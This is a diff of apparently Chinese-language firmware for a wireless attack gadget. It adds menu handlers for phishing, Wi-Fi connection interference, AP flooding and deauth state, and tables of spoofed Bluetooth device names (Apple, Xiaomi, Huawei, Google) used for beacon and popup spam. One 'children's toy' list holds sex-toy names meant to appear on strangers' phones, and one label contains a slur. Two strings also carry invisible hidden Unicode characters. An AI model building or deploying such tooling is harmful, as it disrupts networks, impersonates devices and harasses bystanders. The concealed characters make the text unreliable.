+    //   u8g2_for_adafruit_gfx.setCursor(5, 20);
+    //   u8g2_for_adafruit_gfx.print("为确保资源完全释放");
+    //   u8g2_for_adafruit_gfx.setCursor(5, 40);
+    //   u8g2_for_adafruit_gfx.print("请重启设备后再次运行");
+    //   u8g2_for_adafruit_gfx.setCursor(5, 60);
+    //   u8g2_for_adafruit_gfx.print("《 返回主菜单");
+    //   display.display();
+    //   while (digitalRead(BTN_BACK) != LOW) { delay(10); }
+    //   while (digitalRead(BTN_BACK) == LOW) { delay(10); }
+    // } else {
     if (apWebPageSelectionMenu()) {
       // 稳定按键状态，为确认弹窗做准备
       stabilizeButtonState();
@@ -8886,9 +8614,7 @@ void homeActionPhishing() {
 void homeActionConnInterfere() {
   // 连接干扰
   if (SelectedVector.empty()) { 
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
+    showModalMessage("请先选择AP/SSID"); 
     return; 
   }
   // 显示连接干扰说明页面
@@ -8907,39 +8633,10 @@ void homeActionConnInterfere() {
   }
 }
 
-void homeActionBeaconTamper() {
-  // 广播黑洞
-  if (SelectedVector.empty()) { 
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
-    return; 
-  }
-  // 显示广播黑洞说明页面
-  if (showBeaconTamperInfoPage()) {
-    // 显示警告页面
-    if (showBeaconTamperWarningPage()) {
-      stabilizeButtonState();
-      // 多选目标时显示确认弹窗
-      if (SelectedVector.size() > 3) {
-        if (showConfirmModal("目标过多可能影响效果", "《 返回", "继续 》")) {
-          BeaconTamper();
-        }
-      } else {
-        if (showConfirmModal("启动广播黑洞")) {
-          BeaconTamper();
-        }
-      }
-    }
-  }
-}
-
 void homeActionApFlood() {
   // 请求发送（认证/关联请求泛洪 / AP洪水攻击）
   if (SelectedVector.empty()) { 
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
+    showModalMessage("请先选择AP/SSID"); 
     return; 
   }
   // 先显示AP洪水攻击说明页面；确认则继续，返回则回到主菜单
@@ -8973,6 +8670,7 @@ void homeActionPacketMonitor() {
   // 稳定按键状态，为确认弹窗做准备
   stabilizeButtonState();
   if (showConfirmModal("启动数据包监视")) {
+    checkBleResourcesForWiFi(); // 检查并清理BLE资源
     drawPacketDetectPage();
   }
 }
@@ -8981,6 +8679,7 @@ void homeActionDeepScan() {
   // 稳定按键状态，为确认弹窗做准备
   stabilizeButtonState();
   if (showConfirmModal("启动深度扫描")) {
+    checkBleResourcesForWiFi(); // 检查并清理BLE资源
     drawDeepScan();
   }
 }
@@ -8993,530 +8692,1929 @@ void homeActionWebUI() {
   }
 }
 
-void homeActionQuickCapture() {
-  if (SelectedVector.empty()) {
-    if (showSelectSSIDConfirmModal()) {
-      drawssid(); // 进入AP/SSID选择页面
-    }
-    return;
+// ===== BLE helpers and actions =====
+static bool ensureBleSafeToStart() {
+  extern bool hs_sniffer_running;
+  if (web_ui_active || web_test_active || hs_sniffer_running || deauthAttackRunning || beaconAttackRunning) {
+    showModalMessage("请先停止WiFi/Web功能", "避免与蓝牙冲突");
+    return false;
   }
-  
-  // 显示抓包模式选择界面
-  drawQuickCaptureModeSelection();
+  return true;
 }
 
-// 快速抓包模式选择界面
-void drawQuickCaptureModeSelection() {
-  int modeState = 0; // 0=主动, 1=被动, 2=高效
-  const char* modeNames[] = {"主动模式", "被动模式", "高效模式"};
+// ===== BLE Beacon Device Categories =====
+
+// 定义缺失的 GAP_GATT_APPEARANCE 常量
+#ifndef GAP_GATT_APPEARANCE_PHONE
+#define GAP_GATT_APPEARANCE_PHONE 64
+#endif
+#ifndef GAP_GATT_APPEARANCE_WATCH
+#define GAP_GATT_APPEARANCE_WATCH 192
+#endif
+#ifndef GAP_GATT_APPEARANCE_DISPLAY
+#define GAP_GATT_APPEARANCE_DISPLAY 320
+#endif
+#ifndef GAP_GATT_APPEARANCE_HID_HEADSET
+#define GAP_GATT_APPEARANCE_HID_HEADSET 896
+#endif
+#ifndef GAP_GATT_APPEARANCE_GENERIC_AUDIO
+#define GAP_GATT_APPEARANCE_GENERIC_AUDIO 1024
+#endif
+#ifndef GAP_GATT_APPEARANCE_TABLET
+#define GAP_GATT_APPEARANCE_TABLET 320
+#endif
+#ifndef GAP_GATT_APPEARANCE_GENERIC_COMPUTER
+#define GAP_GATT_APPEARANCE_GENERIC_COMPUTER 128
+#endif
+#ifndef GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE
+#define GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE 960
+#endif
+#ifndef GAP_GATT_APPEARANCE_VIDEO_DISPLAY
+#define GAP_GATT_APPEARANCE_VIDEO_DISPLAY 320
+#endif
+#ifndef GAP_GATT_APPEARANCE_AUDIO_DEVICE
+#define GAP_GATT_APPEARANCE_AUDIO_DEVICE 1024
+#endif
+#ifndef GAP_GATT_APPEARANCE_SENSOR
+#define GAP_GATT_APPEARANCE_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_GENERIC_TAG
+#define GAP_GATT_APPEARANCE_GENERIC_TAG 576
+#endif
+#ifndef GAP_GATT_APPEARANCE_HEART_RATE_SENSOR
+#define GAP_GATT_APPEARANCE_HEART_RATE_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_BP_SENSOR
+#define GAP_GATT_APPEARANCE_BP_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_GLUCOSE_METER
+#define GAP_GATT_APPEARANCE_GLUCOSE_METER 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_CYCLING_SENSOR
+#define GAP_GATT_APPEARANCE_CYCLING_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR
+#define GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_THERMOMETER
+#define GAP_GATT_APPEARANCE_THERMOMETER 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_BEACON
+#define GAP_GATT_APPEARANCE_BEACON 576
+#endif
+#ifndef GAP_GATT_APPEARANCE_LIGHT_SENSOR
+#define GAP_GATT_APPEARANCE_LIGHT_SENSOR 832
+#endif
+#ifndef GAP_GATT_APPEARANCE_ALARM_CLOCK
+#define GAP_GATT_APPEARANCE_ALARM_CLOCK 832
+#endif
+
+// BLE Appearance constants for mixed category (values per spec provided)
+#ifndef BLE_APPEARANCE_UNKNOWN
+#define BLE_APPEARANCE_UNKNOWN 0
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_PHONE
+#define BLE_APPEARANCE_GENERIC_PHONE 64
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_COMPUTER
+#define BLE_APPEARANCE_GENERIC_COMPUTER 128
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_WATCH
+#define BLE_APPEARANCE_GENERIC_WATCH 192
+#endif
+#ifndef BLE_APPEARANCE_WATCH_SPORTS_WATCH
+#define BLE_APPEARANCE_WATCH_SPORTS_WATCH 193
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_CLOCK
+#define BLE_APPEARANCE_GENERIC_CLOCK 256
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_DISPLAY
+#define BLE_APPEARANCE_GENERIC_DISPLAY 320
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_REMOTE_CONTROL
+#define BLE_APPEARANCE_GENERIC_REMOTE_CONTROL 384
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_EYE_GLASSES
+#define BLE_APPEARANCE_GENERIC_EYE_GLASSES 448
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_TAG
+#define BLE_APPEARANCE_GENERIC_TAG 512
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_KEYRING
+#define BLE_APPEARANCE_GENERIC_KEYRING 576
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_MEDIA_PLAYER
+#define BLE_APPEARANCE_GENERIC_MEDIA_PLAYER 640
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_BARCODE_SCANNER
+#define BLE_APPEARANCE_GENERIC_BARCODE_SCANNER 704
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_THERMOMETER
+#define BLE_APPEARANCE_GENERIC_THERMOMETER 768
+#endif
+#ifndef BLE_APPEARANCE_THERMOMETER_EAR
+#define BLE_APPEARANCE_THERMOMETER_EAR 769
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_HEART_RATE_SENSOR
+#define BLE_APPEARANCE_GENERIC_HEART_RATE_SENSOR 832
+#endif
+#ifndef BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT
+#define BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT 833
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_BLOOD_PRESSURE
+#define BLE_APPEARANCE_GENERIC_BLOOD_PRESSURE 896
+#endif
+#ifndef BLE_APPEARANCE_BLOOD_PRESSURE_ARM
+#define BLE_APPEARANCE_BLOOD_PRESSURE_ARM 897
+#endif
+#ifndef BLE_APPEARANCE_BLOOD_PRESSURE_WRIST
+#define BLE_APPEARANCE_BLOOD_PRESSURE_WRIST 898
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_HID
+#define BLE_APPEARANCE_GENERIC_HID 960
+#endif
+#ifndef BLE_APPEARANCE_HID_KEYBOARD
+#define BLE_APPEARANCE_HID_KEYBOARD 961
+#endif
+#ifndef BLE_APPEARANCE_HID_MOUSE
+#define BLE_APPEARANCE_HID_MOUSE 962
+#endif
+#ifndef BLE_APPEARANCE_HID_JOYSTICK
+#define BLE_APPEARANCE_HID_JOYSTICK 963
+#endif
+#ifndef BLE_APPEARANCE_HID_GAMEPAD
+#define BLE_APPEARANCE_HID_GAMEPAD 964
+#endif
+#ifndef BLE_APPEARANCE_HID_DIGITIZERSUBTYPE
+#define BLE_APPEARANCE_HID_DIGITIZERSUBTYPE 965
+#endif
+#ifndef BLE_APPEARANCE_HID_CARD_READER
+#define BLE_APPEARANCE_HID_CARD_READER 966
+#endif
+#ifndef BLE_APPEARANCE_HID_DIGITAL_PEN
+#define BLE_APPEARANCE_HID_DIGITAL_PEN 967
+#endif
+#ifndef BLE_APPEARANCE_HID_BARCODE
+#define BLE_APPEARANCE_HID_BARCODE 968
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_GLUCOSE_METER
+#define BLE_APPEARANCE_GENERIC_GLUCOSE_METER 1024
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_RUNNING_WALKING_SENSOR
+#define BLE_APPEARANCE_GENERIC_RUNNING_WALKING_SENSOR 1088
+#endif
+#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE
+#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE 1089
+#endif
+#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE
+#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE 1090
+#endif
+#ifndef BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP
+#define BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP 1091
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_CYCLING
+#define BLE_APPEARANCE_GENERIC_CYCLING 1152
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER
+#define BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER 1153
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_SPEED_SENSOR
+#define BLE_APPEARANCE_CYCLING_SPEED_SENSOR 1154
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_CADENCE_SENSOR
+#define BLE_APPEARANCE_CYCLING_CADENCE_SENSOR 1155
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_POWER_SENSOR
+#define BLE_APPEARANCE_CYCLING_POWER_SENSOR 1156
+#endif
+#ifndef BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR
+#define BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR 1157
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_PULSE_OXIMETER
+#define BLE_APPEARANCE_GENERIC_PULSE_OXIMETER 3136
+#endif
+#ifndef BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP
+#define BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP 3137
+#endif
+#ifndef BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN
+#define BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN 3138
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_WEIGHT_SCALE
+#define BLE_APPEARANCE_GENERIC_WEIGHT_SCALE 3200
+#endif
+#ifndef BLE_APPEARANCE_GENERIC_OUTDOOR_SPORTS_ACT
+#define BLE_APPEARANCE_GENERIC_OUTDOOR_SPORTS_ACT 5184
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP 5185
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP 5186
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD 5187
+#endif
+#ifndef BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD
+#define BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD 5188
+#endif
+
+#ifndef GAP_APPEARANCE_HID_KEYBOARD
+#define GAP_APPEARANCE_HID_KEYBOARD 961
+#endif
+#ifndef GAP_GATT_APPEARANCE_HID_KEYBOARD
+#define GAP_GATT_APPEARANCE_HID_KEYBOARD 961
+#endif
+
+// Additional Appearance subcategories used below
+#ifndef GAP_APPEARANCE_HID_MOUSE
+#define GAP_APPEARANCE_HID_MOUSE 962
+#endif
+#ifndef GAP_GATT_APPEARANCE_HID_MOUSE
+#define GAP_GATT_APPEARANCE_HID_MOUSE 962
+#endif
+
+#ifndef GAP_APPEARANCE_HEADSET
+#define GAP_APPEARANCE_HEADSET 1025
+#endif
+#ifndef GAP_GATT_APPEARANCE_HEADSET
+#define GAP_GATT_APPEARANCE_HEADSET 1025
+#endif
+
+#ifndef GAP_APPEARANCE_HEADPHONES
+#define GAP_APPEARANCE_HEADPHONES 1026
+#endif
+#ifndef GAP_GATT_APPEARANCE_HEADPHONES
+#define GAP_GATT_APPEARANCE_HEADPHONES 1026
+#endif
+
+#ifndef GAP_APPEARANCE_EARBUD
+#define GAP_APPEARANCE_EARBUD 1027
+#endif
+#ifndef GAP_GATT_APPEARANCE_EARBUD
+#define GAP_GATT_APPEARANCE_EARBUD 1027
+#endif
+
+struct BleBeaconDevice {
+  const char* name;
+  uint16_t appearance;
+  const char* service_uuid;
+  uint16_t company_id;
+};
+
+// 苹果全家桶设备
+static const BleBeaconDevice g_appleDevices[] = {
+  {"iPhone 17 Pro Max",               GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x004C},
+  {"iPad Pro",                        GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x004C},
+  {"MacBook Pro",                     GAP_GATT_APPEARANCE_GENERIC_COMPUTER,        "180F", 0x004C},
+  {"AirPods 4 Pro",                   GAP_APPEARANCE_EARBUD,                       "180F", 0x0941},
+  {"AirPods Max",                     GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,  "180F", 0x004C},
+  {"Apple Watch Series 10",           GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x004C},
+  {"Apple Vision Pro",                GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,  "180F", 0x004C},
+  {"Apple TV 6 4K",                   GAP_GATT_APPEARANCE_VIDEO_DISPLAY,           "180F", 0x004C},
+  {"HomePod mini",                    GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x004C},
+  {"Apple 妙控键盘",                   GAP_APPEARANCE_HID_KEYBOARD,                 "180F", 0x03C1},
+  {"Apple 妙控鼠󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠标",                   GAP_APPEARANCE_HID_MOUSE,                    "180F", 0x03C2},
+  {"Apple Pencil",                    BLE_APPEARANCE_HID_DIGITAL_PEN,              "180F", 0x004C}
+};
+static const int g_appleDeviceCount = sizeof(g_appleDevices) / sizeof(g_appleDevices[0]);
+
+// 小米全家桶设备
+static const BleBeaconDevice g_xiaomiDevices[] = {
+  {"Xiaomi 17 Pro Max",                GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x038F},
+  {"Redmi Note 1󠅧󠅧󠅧󠄞󠇖󠆇󠆐󠇕󠆀󠅽󠄞󠅤󠅟󠅠3",                    GAP_GATT_APPEARANCE_PHONE,                   "180F", 0x038F},
+  {"Redmi Book 14",                    GAP_GATT_APPEARANCE_GENERIC_COMPUTER,        "180F", 0x038F},
+  {"Redmi Buds 6",                     GAP_APPEARANCE_EARBUD,                       "180F", 0x0941},
+  {"小米手环 9 Pro",                    GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x038F},
+  {"小米智能打印机",                    GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x038F},
+  {"小米无线键盘",                      GAP_APPEARANCE_HID_KEYBOARD,                 "180F", 0x03C1},
+  {"小米无线鼠标",                      GAP_APPEARANCE_HID_MOUSE,                    "180F", 0x03C2},
+  {"小米智能签字笔",                    BLE_APPEARANCE_HID_DIGITAL_PEN,              "180F", 0xFFFF},
+  {"Xiaomi Watch S1",                  GAP_GATT_APPEARANCE_WATCH,                   "180F", 0x038F},
+  {"Xiaomi SU7 Ultra",                 GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x038F},
+  {"Xiaomi Pad 7",                     GAP_GATT_APPEARANCE_TABLET,                  "180F", 0x038F},
+  {"Xiaomi Smart Speaker",             GAP_GATT_APPEARANCE_AUDIO_DEVICE,            "180F", 0x038F},
+  {"Xiaomi Smart Scale",               GAP_GATT_APPEARANCE_SENSOR,                  "180F", 0x038F}
+};
+static const int g_xiaomiDeviceCount = sizeof(g_xiaomiDevices) / sizeof(g_xiaomiDevices[0]);
+
+// 儿童玩具设备
+static const BleBeaconDevice g_toyDevices[] = {
+  {"遥控按摩震动笔", BLE_APPEARANCE_HID_DIGITAL_PEN, "180F", 0xFFFF},
+  {"按摩震动棒-A", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
+  {"郊狼电击理疗仪", GAP_GATT_APPEARANCE_WATCH, "180F", 0x038F},
+  {"按摩震动棒-B", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
+  {"加热震动仙女棒", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF},
+  {"按摩震动棒-C", GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE, "1812", 0xFFFF}
+};
+static const int g_toyDeviceCount = sizeof(g_toyDevices) / sizeof(g_toyDevices[0]);
+
+// 华为全家桶设备
+static const BleBeaconDevice g_huaweiDevices[] = {
+    {"HUAWEI Mate 70",              GAP_GATT_APPEARANCE_PHONE,                    "180F", 0x027D},
+    {"HUAWEI MatePad",              GAP_GATT_APPEARANCE_TABLET,                   "180F", 0x027D},
+    {"HUAWEI MateBook",             GAP_GATT_APPEARANCE_GENERIC_COMPUTER,         "180F", 0x027D},
+    {"HUAWEI Earbuds",              GAP_APPEARANCE_EARBUD,                        "180F", 0x0941},
+    {"HUAWEI Watch 4",              GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x027D},
+    {"HUAWEI Watch GT 5",           GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x027D},
+    {"Huawei AR Glasses",           GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,   "180F", 0x027D},
+    {"Huawei Smart Box",            GAP_GATT_APPEARANCE_VIDEO_DISPLAY,            "180F", 0x027D},
+    {"Huawei Speaker",              GAP_GATT_APPEARANCE_AUDIO_DEVICE,             "180F", 0x027D},
+    {"华为智能体重秤",               GAP_GATT_APPEARANCE_GENERIC_TAG,              "180F", 0x027D}
+};
+static const int g_huaweiDeviceCount = sizeof(g_huaweiDevices) / sizeof(g_huaweiDevices[0]);
+
+// Google全家桶设备
+static const BleBeaconDevice g_googleDevices[] = {
+    {"Google Pixel Fold",              GAP_GATT_APPEARANCE_PHONE,                    "180F", 0x00E0},
+    {"Google Pixel Tablet",            GAP_GATT_APPEARANCE_TABLET,                   "180F", 0x00E0},
+    {"Chromebook",                     GAP_GATT_APPEARANCE_GENERIC_COMPUTER,         "180F", 0x00E0},
+    {"Pixel Earbuds Buds",             GAP_APPEARANCE_EARBUD,                        "180F", 0x0941},
+    {"Google Pixel Watch",             GAP_GATT_APPEARANCE_WATCH,                    "180F", 0x00E0},
+    {"Google Glass AR",                GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE,   "180F", 0x00E0},
+    {"Google TV",                      GAP_GATT_APPEARANCE_VIDEO_DISPLAY,            "180F", 0x00E0},
+    {"Google Nest Speaker",            GAP_GATT_APPEARANCE_AUDIO_DEVICE,             "180F", 0x00E0},
+    {"Google Nest Door",               GAP_GATT_APPEARANCE_GENERIC_TAG,              "180F", 0x00E0}
+};
+static const int g_googleDeviceCount = sizeof(g_googleDevices) / sizeof(g_googleDevices[0]);
+
+// 全类型大杂烩（混合）
+static const BleBeaconDevice g_mixedDevices[] = {
+    {"[米家]智能眼镜",                     BLE_APPEARANCE_GENERIC_EYE_GLASSES,            "180F", 0xFFFF},
+    {"[米家]运动手表",                     BLE_APPEARANCE_WATCH_SPORTS_WATCH,             "180F", 0xFFFF},
+    {"[米家]智能手机",                     BLE_APPEARANCE_GENERIC_PHONE,                  "180F", 0xFFFF},
+    {"[米家]平板电脑",                     BLE_APPEARANCE_GENERIC_COMPUTER,               "180F", 0xFFFF},
+    {"[米家]遥控器",                       BLE_APPEARANCE_GENERIC_REMOTE_CONTROL,         "180F", 0xFFFF},
+    {"[米家]标签",                         BLE_APPEARANCE_GENERIC_TAG,                    "180F", 0xFFFF},
+    {"[米家]钥匙扣",                       BLE_APPEARANCE_GENERIC_KEYRING,                "180F", 0xFFFF},
+    {"[米家]媒体播放器",                   BLE_APPEARANCE_GENERIC_MEDIA_PLAYER,           "180F", 0xFFFF},
+    {"[米家]条码扫描枪",                   BLE_APPEARANCE_GENERIC_BARCODE_SCANNER,        "180F", 0xFFFF},
+    {"[米家]体温计(耳温)",                 BLE_APPEARANCE_THERMOMETER_EAR,                "180F", 0xFFFF},
+    {"[米家]心率带",                       BLE_APPEARANCE_HEART_RATE_SENSOR_HEART_RATE_BELT, "180F", 0xFFFF},
+    {"[米家]血压计(上臂)",                 BLE_APPEARANCE_BLOOD_PRESSURE_ARM,             "180F", 0xFFFF},
+    {"[米家]血压计(手腕)",                 BLE_APPEARANCE_BLOOD_PRESSURE_WRIST,           "180F", 0xFFFF},
+    {"[米家]键盘",                         BLE_APPEARANCE_HID_KEYBOARD,                   "180F", 0xFFFF},
+    {"[米家]鼠标",                         BLE_APPEARANCE_HID_MOUSE,                      "180F", 0xFFFF},
+    {"[米家]游戏手柄",                     BLE_APPEARANCE_HID_GAMEPAD,                    "180F", 0xFFFF},
+    {"[米家]操纵杆",                       BLE_APPEARANCE_HID_JOYSTICK,                   "180F", 0xFFFF},
+    {"[米家]数位板",                       BLE_APPEARANCE_HID_DIGITIZERSUBTYPE,           "180F", 0xFFFF},
+    {"[米家]读卡器",                       BLE_APPEARANCE_HID_CARD_READER,                "180F", 0xFFFF},
+    {"[米家]数字笔",                       BLE_APPEARANCE_HID_DIGITAL_PEN,                "180F", 0xFFFF},
+    {"[米家]条码扫描器(HID)",              BLE_APPEARANCE_HID_BARCODE,                    "180F", 0xFFFF},
+    {"[米家]血糖仪",                       BLE_APPEARANCE_GENERIC_GLUCOSE_METER,          "180F", 0xFFFF},
+    {"[米家]跑步传感器(鞋内)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_IN_SHOE, "180F", 0xFFFF},
+    {"[米家]跑步传感器(鞋上)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_SHOE, "180F", 0xFFFF},
+    {"[米家]跑步传感器(腰部)",             BLE_APPEARANCE_RUNNING_WALKING_SENSOR_ON_HIP,  "180F", 0xFFFF},
+    {"[米家]骑行码表",                     BLE_APPEARANCE_CYCLING_CYCLING_COMPUTER,       "180F", 0xFFFF},
+    {"[米家]骑行速度传感器",               BLE_APPEARANCE_CYCLING_SPEED_SENSOR,           "180F", 0xFFFF},
+    {"[米家]骑行踏频传感器",               BLE_APPEARANCE_CYCLING_CADENCE_SENSOR,         "180F", 0xFFFF},
+    {"[米家]骑行功率计",                   BLE_APPEARANCE_CYCLING_POWER_SENSOR,           "180F", 0xFFFF},
+    {"[米家]速度踏频一体",                 BLE_APPEARANCE_CYCLING_SPEED_CADENCE_SENSOR,   "180F", 0xFFFF},
+    {"[米家]血氧仪(指夹)",                 BLE_APPEARANCE_PULSE_OXIMETER_FINGERTIP,       "180F", 0xFFFF},
+    {"[米家]血氧仪(腕戴)",                 BLE_APPEARANCE_PULSE_OXIMETER_WRIST_WORN,      "180F", 0xFFFF},
+    {"[米家]体重秤",                       BLE_APPEARANCE_GENERIC_WEIGHT_SCALE,           "180F", 0xFFFF},
+    {"[米家]户外运动定位显示",             BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_DISP,    "180F", 0xFFFF},
+    {"[米家]户外运动定位+导航显示",       BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_DISP, "180F", 0xFFFF},
+    {"[米家]户外运动定位POD",             BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_POD,     "180F", 0xFFFF},
+    {"[米家]户外运动定位+导航POD",       BLE_APPEARANCE_OUTDOOR_SPORTS_ACT_LOC_AND_NAV_POD,  "180F", 0xFFFF}
+};
+static const int g_mixedDeviceCount = sizeof(g_mixedDevices) / sizeof(g_mixedDevices[0]);
+
+// 罕见设备整合
+static const BleBeaconDevice g_miscDevices[] = {
+    {"Heart Rate Monitor",             GAP_GATT_APPEARANCE_HEART_RATE_SENSOR,         "180F", 0xFFFF},
+    {"Blood Pressure Monitor",         GAP_GATT_APPEARANCE_BP_SENSOR,                 "180F", 0xFFFF},
+    {"Glucose Meter",                  GAP_GATT_APPEARANCE_GLUCOSE_METER,             "180F", 0xFFFF},
+    {"Cycling Speed",                  GAP_GATT_APPEARANCE_CYCLING_SENSOR,            "180F", 0xFFFF},
+    {"Walking Sensor",                 GAP_GATT_APPEARANCE_RUNNING_WALKING_SENSOR,    "180F", 0xFFFF},
+    {"Indoor Bike Sensor",             GAP_GATT_APPEARANCE_CYCLING_SENSOR,            "180F", 0xFFFF},
+    {"外星科技体温计",                  GAP_GATT_APPEARANCE_THERMOMETER,                "180F", 0xFFFF},
+    {"Generic Tag 智障标签",            GAP_GATT_APPEARANCE_GENERIC_TAG,               "180F", 0xFFFF},
+    {"iBeacon",                        GAP_GATT_APPEARANCE_BEACON,                    "180F", 0xFFFF},
+    {"智能光照传感器",                  GAP_GATT_APPEARANCE_LIGHT_SENSOR,              "180F", 0xFFFF},
+    {"外星科技无线耳机",                GAP_APPEARANCE_HEADSET,                        "180F", 0x0942},
+    {"高科技智能耳机",                  GAP_APPEARANCE_HEADPHONES,                     "180F", 0x0943 },
+    {"Clock Device",                   GAP_GATT_APPEARANCE_ALARM_CLOCK,               "180F", 0xFFFF}
+};
+static const int g_miscDeviceCount = sizeof(g_miscDevices) / sizeof(g_miscDevices[0]);
+
+// 设备类别枚举
+enum BleDeviceCategory {
+  BLE_CATEGORY_APPLE = 0,
+  BLE_CATEGORY_XIAOMI = 1,
+  BLE_CATEGORY_HUAWEI = 2,
+  BLE_CATEGORY_GOOGLE = 3,
+  BLE_CATEGORY_MIXED = 4,
+  BLE_CATEGORY_MISC = 5,
+  BLE_CATEGORY_TOY = 6
+};
+
+// ===== Generic BLE Menu System =====
+typedef void (*BleMenuAction)();
+
+struct BleMenuItem {
+  const char* label;
+  BleMenuAction action;
+};
+
+// 通用BLE菜单函数
+void showGenericBleMenu(const char* title, const BleMenuItem* items, int itemCount);
+static void drawGenericBleMenuBase(const BleMenuItem* items, int itemCount, int startIndex);
+static void animateGenericBleMenu(int yFrom, int yTo, int rectHeight, const BleMenuItem* items, int itemCount, int startIndex);
+
+// 前向声明
+void bleBeaconDeviceMenu();
+void bleBeaconBroadcast(BleDeviceCategory category);
+void bleBeaconMixedAction();
+
+// BLE信标设备类别回调函数
+void bleBeaconAppleAction();
+void bleBeaconXiaomiAction();
+void bleBeaconToyAction();
+void bleBeaconHuaweiAction();
+void bleBeaconGoogleAction();
+void bleBeaconMiscAction();
+
+void homeActionBleTest() {
+  if (!ensureBleSafeToStart()) return;
+  stabilizeButtonState();
+  bleBeaconDeviceMenu();
+}
+
+void homeActionBlePopupTest() {
+  if (!ensureBleSafeToStart()) return;
+  stabilizeButtonState();
+  blePopupMenu();
+}
+
+// ===== BLE feature implementations (ported from backup) =====
+
+// BLE popup rate control system
+static int g_blePopupRateIndex = 2; // Default to 100ms (index 2)
+static const int BLE_RATE_OPTIONS[] = {20, 50, 100, 200, 300, 400, 500}; // ms
+static const int BLE_RATE_COUNT = sizeof(BLE_RATE_OPTIONS) / sizeof(BLE_RATE_OPTIONS[0]);
+
+// BLE状态管理和资源冲突预防
